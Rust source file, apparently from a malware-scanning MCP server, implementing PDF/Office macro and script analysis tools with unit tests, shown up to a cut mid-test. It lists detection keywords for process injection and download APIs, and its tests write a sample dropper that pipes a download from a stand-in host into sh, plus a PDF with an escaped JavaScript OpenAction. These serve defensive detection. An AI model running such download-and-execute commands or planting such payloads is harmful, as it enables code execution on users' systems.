//! Document and script analyzers: `analyze_document` (PDF, OLE2 and OOXML Office files)
//! and `analyze_script` (shell, PowerShell, JavaScript, Python, batch, VBScript).
//!
//! Both follow the progressive-disclosure rule: the first call returns a summary and the
//! first page of findings, and says which call looks closer. The complete result is kept
//! in the section cache under the file's SHA-256, so filtered and paged follow-up calls
//! slice the stored result and do not analyze again.

use std::{io::Read, path::Path, sync::Arc};

use rmcp::{
    model::{CallToolResult, JsonObject},
    schemars, tool, tool_router, ErrorData,
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};

use crate::{
    hash::calculate_sha256_only,
    ole_vba_analysis::{
        analyze_office, detect_auto_exec_entries, vba_keyword_hits, OfficeReport,
        RiskLevel as OfficeRisk, VbaModuleType,
    },
    pdf_analysis::{scan_pdf, PdfScan, RiskLevel as PdfRisk},
    script_analysis::{
        analyze_script, language_name, parse_script_language, resolve_script_language,
        RiskLevel as ScriptRisk, ScriptReport, ScriptType,
    },
};

use super::{
    output::{input_schema_with_budget, page, parse_request, respond, tool_error, DEFAULT_LIMIT},
    paths::Expect,
    state::{mark_section, ServerState},
    FileScannerMcp,
};

/// Cache key of a complete document result (it does not depend on any argument).
const DOCUMENT_KEY: &str = "document:v2";
/// Cache key of a complete script result (the language override changes it).
const SCRIPT_KEY_PREFIX: &str = "script:v2";

const ANALYZE_DOCUMENT_DESCRIPTION: &str = "Analyze a PDF or a Microsoft Office file (.doc, \
.xls, .ppt, .docx, .docm, .xlsm, .pptm) for risky content. PDF: structure (version, pages, \
objects), JavaScript, OpenAction/AA/Launch actions, embedded files, links, encryption and \
hex-escaped keyword names; actions, scripts, links and attachments carry byte offsets. Office: whether a VBA project is present \
(true only when one is), modules, auto-executing entry points (AutoOpen, Document_Open, ...) \
and suspicious keywords with the module and line. The first call returns a summary and the \
first page of findings; narrow with `category` and page with `offset`/`limit`; for Office use \
`module` to page through one module's source. Call analyze_file first if you are unsure the \
file is a document. Results are capped at `max_output_bytes` (default 80000, ceiling 400000).";

const ANALYZE_SCRIPT_DESCRIPTION: &str = "Analyze one script file: shell, PowerShell, \
JavaScript, Python, batch or VBScript. The language is detected from the shebang, the \
extension and the content (override it with `language`). Reports download-and-execute, \
dynamic execution of decoded data, encoded payloads, persistence, credential access and \
defense evasion, each with the line number and the matching text. The first call returns a \
summary and the first page of findings; narrow with `category` or `min_severity` and page with \
`offset`/`limit`. Not for packages (use analyze_npm_package or analyze_python_package) or \
binaries (use analyze_file). Results are capped at `max_output_bytes` (default 80000, \
ceiling 400000).";

#[tool_router(router = documents_router, vis = "pub(crate)")]
impl FileScannerMcp {
    #[tool(
        name = "analyze_document",
        title = "Analyze PDF or Office document",
        description = ANALYZE_DOCUMENT_DESCRIPTION,
        input_schema = input_schema_with_budget::<DocumentRequest>(),
        annotations(
            title = "Analyze PDF or Office document",
            read_only_hint = true,
            destructive_hint = false,
            idempotent_hint = true,
            open_world_hint = false
        )
    )]
    async fn analyze_document_tool(&self, args: JsonObject) -> Result<CallToolResult, ErrorData> {
        let (request, budget, _raw) = match parse_request::<DocumentRequest>(args) {
            Ok(parsed) => parsed,
            Err(message) => return Ok(tool_error(message)),
        };
        let path = match self
            .state
            .resolve_path(&request.file_path, "File", Expect::File)
        {
            Ok(path) => path,
            Err(message) => return Ok(tool_error(message)),
        };
        Ok(match self.run_document(&path, &request).await {
            Ok(value) => respond(value, budget),
            Err(message) => tool_error(message),
        })
    }

    #[tool(
        name = "analyze_script",
        title = "Analyze script",
        description = ANALYZE_SCRIPT_DESCRIPTION,
        input_schema = input_schema_with_budget::<ScriptRequest>(),
        annotations(
            title = "Analyze script",
            read_only_hint = true,
            destructive_hint = false,
            idempotent_hint = true,
            open_world_hint = false
        )
    )]
    async fn analyze_script_tool(&self, args: JsonObject) -> Result<CallToolResult, ErrorData> {
        let (request, budget, _raw) = match parse_request::<ScriptRequest>(args) {
            Ok(parsed) => parsed,
            Err(message) => return Ok(tool_error(message)),
        };
        let path = match self
            .state
            .resolve_path(&request.file_path, "File", Expect::File)
        {
            Ok(path) => path,
            Err(message) => return Ok(tool_error(message)),
        };
        Ok(match self.run_script(&path, &request).await {
            Ok(value) => respond(value, budget),
            Err(message) => tool_error(message),
        })
    }
}

/// Arguments of `analyze_document`.
#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct DocumentRequest {
    #[schemars(description = "Absolute path of the PDF or Office file")]
    pub file_path: String,
    #[schemars(
        description = "Only findings of this category. PDF: action, script, link, launch, \
                       submit, attachment, evasion, encryption. Office: auto_exec, keyword, \
                       network"
    )]
    pub category: Option<String>,
    #[schemars(
        description = "Office only: the name of one VBA module; returns that module's source \
                       lines (paged with offset and limit) instead of findings"
    )]
    pub module: Option<String>,
    #[schemars(description = "Items to skip (default 0)")]
    pub offset: Option<usize>,
    #[schemars(description = "Items to return (default 50, at most 500)")]
    pub limit: Option<usize>,
}

/// Arguments of `analyze_script`.
#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct ScriptRequest {
    #[schemars(description = "Absolute path of the script file")]
    pub file_path: String,
    #[schemars(
        description = "Force the language: shell, powershell, javascript, python, batch or \
                       vbscript (default: detect from shebang, extension and content)"
    )]
    pub language: Option<String>,
    #[schemars(
        description = "Only findings of this category: download_execute, dynamic_execution, \
                       encoded_payload, persistence, credential_access, defense_evasion, \
                       remote_shell, command_execution, obfuscation, privilege_escalation"
    )]
    pub category: Option<String>,
    #[schemars(description = "Only findings at least this severe: low, medium, high or critical")]
    pub min_severity: Option<String>,
    #[schemars(description = "Items to skip (default 0)")]
    pub offset: Option<usize>,
    #[schemars(description = "Items to return (default 50, at most 500)")]
    pub limit: Option<usize>,
}

const SCRIPT_CATEGORIES: &[&str] = &[
    "download_execute",
    "dynamic_execution",
    "encoded_payload",
    "persistence",
    "credential_access",
    "defense_evasion",
    "remote_shell",
    "command_execution",
    "obfuscation",
    "privilege_escalation",
];
const PDF_CATEGORIES: &[&str] = &[
    "action",
    "script",
    "link",
    "launch",
    "submit",
    "attachment",
    "evasion",
    "encryption",
];
const OFFICE_CATEGORIES: &[&str] = &["auto_exec", "keyword", "network", "modules"];
/// Most lines of one module kept for paging.
const MAX_MODULE_LINES: usize = 20_000;
/// Most keyword findings kept in all.
const MAX_KEYWORD_FINDINGS: usize = 5_000;
/// Module rows and entry points shown in the summary (the rest are paged).
const MAX_AUTO_EXEC_FINDINGS: usize = 500;
const SUMMARY_ROWS: usize = 20;

fn severity_rank(name: &str) -> u8 {
    match name {
        "critical" => 3,
        "high" => 2,
        "medium" => 1,
        _ => 0,
    }
}

fn pdf_level(level: &PdfRisk) -> &'static str {
    match level {
        PdfRisk::Low => "low",
        PdfRisk::Medium => "medium",
        PdfRisk::High => "high",
        PdfRisk::Critical => "critical",
    }
}

fn office_level(level: &OfficeRisk) -> &'static str {
    match level {
        OfficeRisk::Low => "low",
        OfficeRisk::Medium => "medium",
        OfficeRisk::High => "high",
        OfficeRisk::Critical => "critical",
    }
}

fn script_level(level: &ScriptRisk) -> &'static str {
    match level {
        ScriptRisk::Low => "low",
        ScriptRisk::Medium => "medium",
        ScriptRisk::High => "high",
        ScriptRisk::Critical => "critical",
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DocKind {
    Pdf,
    Office,
}

/// Decide from the first bytes what kind of document a file is.
fn sniff_document(path: &Path) -> Result<DocKind, String> {
    let mut head = [0u8; 1024];
    let read = std::fs::File::open(path)
        .and_then(|mut file| file.read(&mut head))
        .map_err(|error| format!("Cannot read {}: {error}", path.display()))?;
    let head = &head[..read];
    if head.windows(5).any(|window| window == b"%PDF-") {
        return Ok(DocKind::Pdf);
    }
    if head.starts_with(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1") || head.starts_with(b"PK") {
        return Ok(DocKind::Office);
    }
    Err(format!(
        "{} is not a PDF or an Office file (no %PDF- header, no OLE2 signature, not a zip). \
         Call analyze_file for an overview of what it is, analyze_script for a script, or \
         inspect_archive for an archive.",
        path.display()
    ))
}

fn evidence_json(evidence: &[crate::pdf_analysis::PdfEvidence], max: usize) -> Value {
    Value::Array(
        evidence
            .iter()
            .take(max)
            .map(|e| json!({"offset": e.offset, "object": e.object, "in_stream": e.in_stream}))
            .collect(),
    )
}

fn feature_severity(name: &str) -> &'static str {
    match name {
        "Launch" => "critical",
        "JavaScript" | "JS" | "EmbeddedFile" | "RichMedia" => "high",
        "OpenAction" | "AA" | "SubmitForm" | "GoToR" | "GoToE" | "ImportData" | "XFA"
        | "JBIG2Decode" => "medium",
        _ => "low",
    }
}

/// Every PDF finding, in the order a reader wants them (actions, scripts, targets, ...).
fn pdf_findings(scan: &PdfScan) -> Vec<Value> {
    let mut findings = Vec::new();
    for feature in &scan.features {
        let is_action = matches!(
            feature.name.as_str(),
            "JavaScript"
                | "JS"
                | "OpenAction"
                | "AA"
                | "Launch"
                | "SubmitForm"
                | "GoToR"
                | "GoToE"
                | "ImportData"
                | "RichMedia"
                | "XFA"
                | "JBIG2Decode"
                | "EmbeddedFile"
                | "EmbeddedFiles"
                | "AcroForm"
        );
        if is_action {
            findings.push(json!({
                "category": "action",
                "name": feature.name,
                "severity": feature_severity(&feature.name),
                "count": feature.count,
                "evidence": evidence_json(&feature.evidence, 10),
            }));
        }
    }
    for script in &scan.scripts {
        findings.push(json!({
            "category": "script",
            "severity": if script.suspicious_patterns.is_empty() { "high" } else { "critical" },
            "offset": script.offset,
            "object": script.object,
            "length": script.length,
            "preview": script.preview,
            "suspicious_patterns": script.suspicious_patterns,
        }));
    }
    for target in &scan.targets {
        let (category, severity) = match target.kind.as_str() {
            "Launch" => ("launch", "critical"),
            "SubmitForm" => ("submit", "medium"),
            _ => ("link", "low"),
        };
        findings.push(json!({
            "category": category,
            "severity": severity,
            "value": target.value,
            "offset": target.offset,
        }));
    }
    for attachment in &scan.attachments {
        findings.push(json!({
            "category": "attachment",
            "severity": "high",
            "filename": attachment.filename,
            "size": attachment.size,
            "offset": attachment.offset,
            "object": attachment.object,
        }));
    }
    for name in &scan.escaped_names {
        findings.push(json!({
            "category": "evasion",
            "severity": "high",
            "name": name,
            "detail": "keyword written with #xx escapes (decoded for this scan)",
        }));
    }
    if let Some(encryption) = &scan.encryption {
        findings.push(json!({
            "category": "encryption",
            "severity": "medium",
            "algorithm": encryption.algorithm,
            "key_length": encryption.key_length,
            "revision": encryption.revision,
        }));
    }
    findings
}

fn pdf_document_value(scan: &PdfScan) -> Value {
    let findings = pdf_findings(scan);
    let mut counts = Map::new();
    for feature in &scan.features {
        counts.insert(feature.name.clone(), json!(feature.count));
    }
    let mut next_steps = vec![
        "analyze_document {file_path, category: \"action\"} lists each risky name with byte offsets"
            .to_string(),
    ];
    if !scan.scripts.is_empty() {
        next_steps.push(
            "analyze_document {file_path, category: \"script\"} shows the JavaScript".to_string(),
        );
    }
    if !scan.targets.is_empty() {
        next_steps.push(
            "analyze_document {file_path, category: \"link\"|\"launch\"|\"submit\"} shows targets"
                .to_string(),
        );
    }
    next_steps.push(
        "analyze_file {file_path, hex_dump: true, hex_dump_offset} shows the bytes at an offset"
            .to_string(),
    );
    json!({
        "summary": {
            "format": "pdf",
            "version": scan.version,
            "file_size": scan.file_size,
            "pages": scan.page_count,
            "objects": scan.object_count,
            "streams": scan.stream_count,
            "object_streams": scan.object_streams.len(),
            "encrypted": scan.is_encrypted,
            "signed": scan.is_signed,
            "linearized": scan.is_linearized,
            "open_action_type": scan.open_action_type,
            "risk": {
                "level": pdf_level(&scan.overall_risk),
                "score": scan.risk_score,
                "reasons": scan.risk_reasons,
            },
            "feature_counts": counts,
            "counts": {
                "scripts": scan.scripts_total.max(scan.scripts.len()),
                "links": scan.links_total.max(scan.targets.iter().filter(|t| t.kind == "URI").count()),
                "launch_and_submit_targets": scan.action_targets_total,
                "attachments": scan.attachments_total.max(scan.attachments.len()),
                "listed": {
                    "scripts": scan.scripts.len(),
                    "targets": scan.targets.len(),
                    "attachments": scan.attachments.len(),
                },
            },
            "info": scan.info,
            "bytes_scanned": scan.bytes_scanned,
            "notes": scan.notes,
            "next_steps": next_steps,
        },
        "findings": findings,
    })
}

fn module_type_name(kind: &VbaModuleType) -> &'static str {
    match kind {
        VbaModuleType::Standard => "standard",
        VbaModuleType::ClassModule => "class",
        VbaModuleType::UserForm => "form",
        VbaModuleType::Document => "document",
        VbaModuleType::Unknown => "unknown",
    }
}

fn keyword_severity(keyword: &str) -> &'static str {
    match keyword {
        "shell" | "createobject" | "wscript.shell" | "cmd.exe" | "powershell"
        | "createremotethread" | "virtualalloc" | "writeprocessmemory" | "urldownloadtofile"
        | "downloadfile" => "high",
        _ => "medium",
    }
}

fn office_document_value(report: &OfficeReport) -> Value {
    let analysis = &report.analysis;
    let mut findings = Vec::new();
    let mut module_sources = Map::new();
    let mut module_rows: Vec<Value> = Vec::new();
    let mut keyword_total = 0usize;
    let mut auto_exec_total = 0usize;
    if let Some(project) = &analysis.vba_project {
        for module in &project.modules {
            let total_lines = module
                .source_code
                .as_deref()
                .map_or(0, |source| source.lines().count());
            let lines: Vec<&str> = module
                .source_code
                .as_deref()
                .map(|source| source.lines().take(MAX_MODULE_LINES).collect())
                .unwrap_or_default();
            module_rows.push(json!({
                "category": "modules",
                "name": module.name,
                "type": module_type_name(&module.module_type),
                "lines": total_lines,
                "lines_kept": lines.len(),
                "has_source": module.source_code.is_some(),
            }));
            if let Some(source) = &module.source_code {
                for entry in detect_auto_exec_entries(source, &module.name) {
                    auto_exec_total += 1;
                    if auto_exec_total > MAX_AUTO_EXEC_FINDINGS {
                        continue;
                    }
                    findings.push(json!({
                        "category": "auto_exec",
                        "severity": "high",
                        "module": entry.module,
                        "procedure": entry.procedure,
                        "line": entry.line,
                    }));
                }
                for hit in vba_keyword_hits(source, &module.name) {
                    keyword_total += 1;
                    if keyword_total > MAX_KEYWORD_FINDINGS {
                        continue;
                    }
                    findings.push(json!({
                        "category": "keyword",
                        "severity": keyword_severity(&hit.keyword),
                        "module": hit.module,
                        "keyword": hit.keyword,
                        "line": hit.line,
                        "text": hit.text,
                    }));
                }
                module_sources.insert(module.name.clone(), json!(lines));
            }
        }
    }
    for connection in &analysis.suspicious_indicators.external_connections {
        let line = analysis
            .vba_project
            .as_ref()
            .and_then(|p| p.modules.iter().find(|m| m.name == connection.location))
            .and_then(|m| m.source_code.as_deref())
            .and_then(|source| {
                source
                    .lines()
                    .position(|l| l.contains(connection.target.as_str()))
            })
            .map(|index| index + 1);
        findings.push(json!({
            "category": "network",
            "severity": "high",
            "line": line,
            "module": connection.location,
            "target": connection.target,
            "method": connection.method,
        }));
    }
    let has_macros = analysis.suspicious_indicators.has_macros;
    let mut next_steps = Vec::new();
    if has_macros {
        next_steps.push(
            "analyze_document {file_path, category: \"auto_exec\"} lists entry points that run on open"
                .to_string(),
        );
        if module_rows.len() > SUMMARY_ROWS {
            next_steps.push(format!(
                "analyze_document {{file_path, category: \"modules\", offset: {SUMMARY_ROWS}}} lists the other {} modules",
                module_rows.len() - SUMMARY_ROWS
            ));
        }
        if let Some(first) = module_rows.iter().find(|m| m["has_source"] == json!(true)) {
            next_steps.push(format!(
                "analyze_document {{file_path, module: \"{}\"}} pages through that module's source",
                first["name"].as_str().unwrap_or("")
            ));
        }
    } else {
        next_steps.push("analyze_file {file_path} for strings and a generic overview".to_string());
    }
    let metadata = &analysis.metadata;
    let mut notes = report.notes.clone();
    if keyword_total > MAX_KEYWORD_FINDINGS {
        notes.push(format!(
            "{keyword_total} keyword hits in all; only the first {MAX_KEYWORD_FINDINGS} are kept."
        ));
    }
    if module_rows
        .iter()
        .any(|m| m["lines"].as_u64().unwrap_or(0) > MAX_MODULE_LINES as u64)
    {
        notes.push(format!(
            "Modules longer than {MAX_MODULE_LINES} lines are cut to their first \
             {MAX_MODULE_LINES} lines for paging (see lines and lines_kept)."
        ));
    }
    if !report.undecoded_modules.is_empty() {
        notes.push(format!(
            "Source could not be recovered for: {}.",
            report.undecoded_modules.join(", ")
        ));
    }
    json!({
        "summary": {
            "format": report.container,
            "file_type": format!("{:?}", analysis.file_type),
            "has_macros": has_macros,
            "vba_part": report.vba_part,
            "vba_storages": report.vba_storages,
            "module_source": report.module_source,
            "project_name": analysis.vba_project.as_ref().map(|p| p.project_name.clone()),
            "modules": module_rows.iter().take(SUMMARY_ROWS).collect::<Vec<_>>(),
            "auto_exec": analysis
                .suspicious_indicators
                .auto_exec_macros
                .iter()
                .take(SUMMARY_ROWS)
                .collect::<Vec<_>>(),
            "risk": {
                "level": office_level(&analysis.security_assessment.overall_risk),
                "score": analysis.suspicious_indicators.risk_score,
                "factors": analysis
                    .security_assessment
                    .risk_factors
                    .iter()
                    .map(|f| f.description.clone())
                    .collect::<Vec<_>>(),
            },
            "counts": {
                "streams": analysis.streams.len(),
                "modules": module_rows.len(),
                "auto_exec": analysis.suspicious_indicators.auto_exec_macros.len(),
                "findings": findings.len(),
            },
            "metadata": {
                "title": metadata.title,
                "author": metadata.author,
                "last_author": metadata.last_author,
                "application": metadata.application_name,
            },
            "notes": notes,
            "next_steps": next_steps,
        },
        "findings": findings,
        "module_rows": module_rows,
        "modules": module_sources,
    })
}

/// A page of findings (after the optional category filter), or one module's source page.
fn slice_document(full: &Value, request: &DocumentRequest, cache: &str) -> Result<Value, String> {
    let offset = request.offset.unwrap_or(0);
    let limit = request.limit.unwrap_or(DEFAULT_LIMIT);
    let mut out = Map::new();
    out.insert("cache".into(), json!(cache));
    if let Some(module) = &request.module {
        let Some(modules) = full["modules"].as_object() else {
            return Err(
                "`module` applies to Office files with a VBA project; this file has none."
                    .to_string(),
            );
        };
        let found = modules
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(module));
        let Some((name, lines)) = found else {
            let names: Vec<&str> = modules.keys().map(String::as_str).collect();
            return Err(format!(
                "No VBA module named {module} with readable source. Modules with source: {}.",
                if names.is_empty() {
                    "(none)".to_string()
                } else {
                    names.join(", ")
                }
            ));
        };
        let numbered: Vec<String> = lines
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or_default()
            .iter()
            .enumerate()
            .map(|(index, line)| format!("{}: {}", index + 1, line.as_str().unwrap_or("")))
            .collect();
        out.insert("module".into(), json!(name));
        out.insert("source".into(), page(&numbered, offset, limit));
        return Ok(Value::Object(out));
    }
    if let Some(category) = &request.category {
        let valid = if full["summary"]["format"].as_str() == Some("pdf") {
            PDF_CATEGORIES
        } else {
            OFFICE_CATEGORIES
        };
        if !valid.contains(&category.as_str()) {
            return Err(format!(
                "Unknown category {category}. Categories for this file: {}.",
                valid.join(", ")
            ));
        }
    }
    out.insert("summary".into(), full["summary"].clone());
    let all = if request.category.as_deref() == Some("modules") {
        full["module_rows"].as_array().cloned().unwrap_or_default()
    } else {
        full["findings"].as_array().cloned().unwrap_or_default()
    };
    let selected: Vec<Value> = match &request.category {
        Some(category) => all
            .into_iter()
            .filter(|f| f["category"].as_str() == Some(category.as_str()))
            .collect(),
        None => all,
    };
    if let Some(category) = &request.category {
        if selected.is_empty() {
            out.insert(
                "hint".into(),
                json!(format!(
                    "No findings with category {category}; see summary.counts."
                )),
            );
        }
    }
    out.insert("findings".into(), page(&selected, offset, limit));
    Ok(Value::Object(out))
}

impl FileScannerMcp {
    async fn run_document(&self, path: &Path, request: &DocumentRequest) -> Result<Value, String> {
        let kind = sniff_document(path)?;
        let sha256 = calculate_sha256_only(path)
            .await
            .map_err(|error| format!("Cannot read {}: {error:#}", path.display()))?;
        let state = Arc::clone(&self.state);
        let owned = path.to_path_buf();
        let sha = sha256.clone();
        let (full, cache) = self
            .state
            .run_blocking("analyze_document", move || {
                compute_document(&state, &sha, &owned, kind)
            })
            .await??;
        slice_document(&full, request, cache)
    }

    async fn run_script(&self, path: &Path, request: &ScriptRequest) -> Result<Value, String> {
        let language = match &request.language {
            Some(name) => Some(parse_script_language(name).ok_or_else(|| {
                format!(
                    "Unknown language {name}. Use one of: shell, powershell, javascript, \
                     python, batch, vbscript."
                )
            })?),
            None => None,
        };
        if let Some(severity) = &request.min_severity {
            if !matches!(severity.as_str(), "low" | "medium" | "high" | "critical") {
                return Err(format!(
                    "Unknown min_severity {severity}. Use low, medium, high or critical."
                ));
            }
        }
        let sha256 = calculate_sha256_only(path)
            .await
            .map_err(|error| format!("Cannot read {}: {error:#}", path.display()))?;
        let state = Arc::clone(&self.state);
        let owned = path.to_path_buf();
        let sha = sha256.clone();
        let (full, cache, detected_by) = self
            .state
            .run_blocking("analyze_script", move || {
                compute_script(&state, &sha, &owned, language)
            })
            .await??;
        slice_script(&full, request, cache, detected_by)
    }
}

fn compute_document(
    state: &ServerState,
    sha256: &str,
    path: &Path,
    kind: DocKind,
) -> Result<(Arc<Value>, &'static str), String> {
    let cache = state.section_cache();
    if let Some(hit) = cache.get(sha256, DOCUMENT_KEY) {
        return Ok((hit, "hit"));
    }
    let value = match kind {
        DocKind::Pdf => {
            mark_section("pdf structure scan");
            let scan = scan_pdf(path).map_err(|error| format!("{error:#}"))?;
            pdf_document_value(&scan)
        }
        DocKind::Office => {
            mark_section("office macro analysis");
            let report = analyze_office(path).map_err(|error| format!("{error:#}"))?;
            if report.container == "zip" || report.container == "none" {
                return Err(format!(
                    "{} is not an Office document: {} Call analyze_file for an overview, or \
                     inspect_archive if it is an archive.",
                    path.display(),
                    report.notes.first().cloned().unwrap_or_default()
                ));
            }
            office_document_value(&report)
        }
    };
    cache.put(sha256, DOCUMENT_KEY, &value);
    Ok((Arc::new(value), "miss"))
}

fn script_value(report: &ScriptReport) -> Value {
    let findings: Vec<Value> = report
        .findings
        .iter()
        .map(|f| {
            json!({
                "category": f.category,
                "rule": f.rule,
                "severity": script_level(&f.severity),
                "line": f.line,
                "matched": f.matched,
                "description": f.description,
            })
        })
        .collect();
    let powershell = report.powershell.as_ref().map(|ps| {
        json!({
            "commands": ps.commands.iter().take(50).collect::<Vec<_>>(),
            "functions": ps.functions.iter().take(50).collect::<Vec<_>>(),
            "imports": ps.imports.iter().take(50).collect::<Vec<_>>(),
            "obfuscated": !ps.obfuscation_indicators.obfuscation_techniques.is_empty(),
            "obfuscation_techniques": ps.obfuscation_indicators.obfuscation_techniques,
            "entropy": ps.obfuscation_indicators.entropy_score,
        })
    });
    let mut next_steps = vec![
        "analyze_script {file_path, category: \"<category>\"} lists one category's findings"
            .to_string(),
        "analyze_script {file_path, min_severity: \"high\"} keeps only the serious ones"
            .to_string(),
    ];
    if report.findings_total > report.findings.len() {
        next_steps.push(format!(
            "{} findings in all; only the first {} are kept and can be paged.",
            report.findings_total,
            report.findings.len()
        ));
    }
    if report.truncated_input {
        next_steps.push(
            "The file is larger than the scan limit; only the start was scanned.".to_string(),
        );
    }
    json!({
        "summary": {
            "language": report.language,
            "line_count": report.line_count,
            "bytes_read": report.bytes_read,
            "truncated_input": report.truncated_input,
            "risk": {
                "level": script_level(&report.overall_risk),
                "score": report.risk_score,
            },
            "findings_total": report.findings_total,
            "findings_kept": report.findings.len(),
            "category_counts": report.category_counts,
            "powershell": powershell,
            "next_steps": next_steps,
        },
        "findings": findings,
    })
}

/// Scan a script. The cache is keyed by content and the resolved language, because the same
/// bytes under another name or an explicit `language` are analyzed by other rules. How the
/// language was decided is per call and not cached.
fn compute_script(
    state: &ServerState,
    sha256: &str,
    path: &Path,
    language: Option<ScriptType>,
) -> Result<(Arc<Value>, &'static str, &'static str), String> {
    let (resolved, detected_by) =
        resolve_script_language(path, language.clone()).map_err(|error| format!("{error:#}"))?;
    let key = format!("{SCRIPT_KEY_PREFIX}:{}", language_name(&resolved));
    let cache = state.section_cache();
    if let Some(hit) = cache.get(sha256, &key) {
        return Ok((hit, "hit", detected_by));
    }
    mark_section("script pattern scan");
    let report = analyze_script(path, Some(resolved)).map_err(|error| format!("{error:#}"))?;
    let value = script_value(&report);
    cache.put(sha256, &key, &value);
    Ok((Arc::new(value), "miss", detected_by))
}

fn slice_script(
    full: &Value,
    request: &ScriptRequest,
    cache: &str,
    detected_by: &str,
) -> Result<Value, String> {
    if let Some(category) = &request.category {
        if !SCRIPT_CATEGORIES.contains(&category.as_str()) {
            return Err(format!(
                "Unknown category {category}. Script categories: {}.",
                SCRIPT_CATEGORIES.join(", ")
            ));
        }
    }
    let offset = request.offset.unwrap_or(0);
    let limit = request.limit.unwrap_or(DEFAULT_LIMIT);
    let min_rank = request.min_severity.as_deref().map_or(0, severity_rank);
    let selected: Vec<Value> = full["findings"]
        .as_array()
        .cloned()
        .unwrap_or_default()
        .into_iter()
        .filter(|f| {
            request
                .category
                .as_deref()
                .is_none_or(|category| f["category"].as_str() == Some(category))
                && severity_rank(f["severity"].as_str().unwrap_or("low")) >= min_rank
        })
        .collect();
    let mut out = Map::new();
    out.insert("cache".into(), json!(cache));
    let mut summary = full["summary"].clone();
    summary["detected_by"] = json!(detected_by);
    out.insert("summary".into(), summary);
    out.insert("findings".into(), page(&selected, offset, limit));
    Ok(Value::Object(out))
}

#[cfg(test)]
mod tests {
    use std::io::Write;

    use rmcp::{
        model::{CallToolRequestParams, CallToolResult},
        ServiceExt,
    };
    use tempfile::TempDir;

    use super::super::FileScannerMcp;

    async fn client() -> rmcp::service::RunningService<rmcp::RoleClient, ()> {
        let (server_io, client_io) = tokio::io::duplex(256 * 1024);
        tokio::spawn(async move {
            if let Ok(service) = FileScannerMcp::new().serve(server_io).await {
                let _ = service.waiting().await;
            }
        });
        ().serve(client_io).await.expect("handshake")
    }

    fn call(name: &'static str, args: serde_json::Value) -> CallToolRequestParams {
        CallToolRequestParams::new(name).with_arguments(args.as_object().unwrap().clone())
    }

    fn text(result: &CallToolResult) -> String {
        result.content[0].as_text().unwrap().text.clone()
    }

    #[tokio::test]
    async fn both_tools_are_listed_with_read_only_annotations() {
        let client = client().await;
        let tools = client.list_all_tools().await.unwrap();
        for name in ["analyze_document", "analyze_script"] {
            let tool = tools.iter().find(|t| t.name == name).expect(name);
            let annotations = tool.annotations.as_ref().expect("annotations");
            assert_eq!(annotations.read_only_hint, Some(true));
            assert_eq!(annotations.open_world_hint, Some(false));
            let schema = serde_json::to_value(&*tool.input_schema).unwrap();
            assert!(schema["properties"]["file_path"].is_object());
            assert!(schema["properties"]["max_output_bytes"].is_object());
        }
        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn script_tool_summarizes_then_pages_and_hits_the_cache() {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("dropper.sh");
        let mut file = std::fs::File::create(&path).unwrap();
        writeln!(
            file,
            "#!/bin/sh\ncurl -s http://example.test/x.sh | sh\ncrontab -l"
        )
        .unwrap();
        drop(file);

        let client = client().await;
        let first = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": path}),
            ))
            .await
            .unwrap();
        assert_ne!(first.is_error, Some(true), "{}", text(&first));
        let value: serde_json::Value = serde_json::from_str(&text(&first)).unwrap();
        assert_eq!(value["cache"], "miss");
        assert_eq!(value["summary"]["language"], "Shell");
        assert_eq!(value["findings"]["total"], 2);

        let second = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": path, "category": "persistence", "limit": 1}),
            ))
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_str(&text(&second)).unwrap();
        assert_eq!(value["cache"], "hit");
        assert_eq!(value["findings"]["total"], 1);
        assert_eq!(value["findings"]["items"][0]["line"], 3);
        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn document_tool_reports_a_pdf_overview_then_a_cached_category_page() {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("a.pdf");
        std::fs::write(
            &path,
            b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /J#61vaScript /JS (app.alert\\(1\\)) >> >>\nendobj\n",
        )
        .unwrap();
        let client = client().await;
        let first = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": path}),
            ))
            .await
            .unwrap();
        assert_ne!(first.is_error, Some(true), "{}", text(&first));
        let value: serde_json::Value = serde_json::from_str(&text(&first)).unwrap();
        assert_eq!(value["cache"], "miss");
        assert_eq!(value["summary"]["format"], "pdf");
        assert_eq!(value["summary"]["version"], "1.7");
        assert!(value["summary"]["feature_counts"]["JavaScript"].is_number());
        let second = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": path, "category": "script"}),
            ))
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_str(&text(&second)).unwrap();
        assert_eq!(value["cache"], "hit");
        assert_eq!(value["findings"]["total"], 1);
        client.cancel().await.unwrap();
    }

    #[tokio::test]
    async fn bad_arguments_and_wrong_files_are_tool_errors() {
        let dir = TempDir::new().unwrap();
        let text_file = dir.path().join("notes.txt");
        std::fs::write(&text_file, "just some notes").unwrap();
        let client = client().await;

        let unknown = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": text_file, "bogus": 1}),
            ))
            .await
            .unwrap();
        assert_eq!(unknown.is_error, Some(true));

        let not_doc = client
            .call_tool(call(
                "analyze_document",
                serde_json::json!({"file_path": text_file}),
            ))
            .await
            .unwrap();
        assert_eq!(not_doc.is_error, Some(true));
        assert!(
            text(&not_doc).contains("not a PDF or an Office file"),
            "{}",
            text(&not_doc)
        );

        let undetectable = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": text_file}),
            ))
            .await
            .unwrap();
        assert_eq!(undetectable.is_error, Some(true));
        assert!(
            text(&undetectable).contains("language"),
            "{}",
            text(&undetectable)
        );

        let bad_language = client
            .call_tool(call(
                "analyze_script",
                serde_json::json!({"file_path": text_file, "language": "cobol"}),
            ))
            .await
            .unwrap();
        assert_eq!(bad_language.is_error, Some(true));
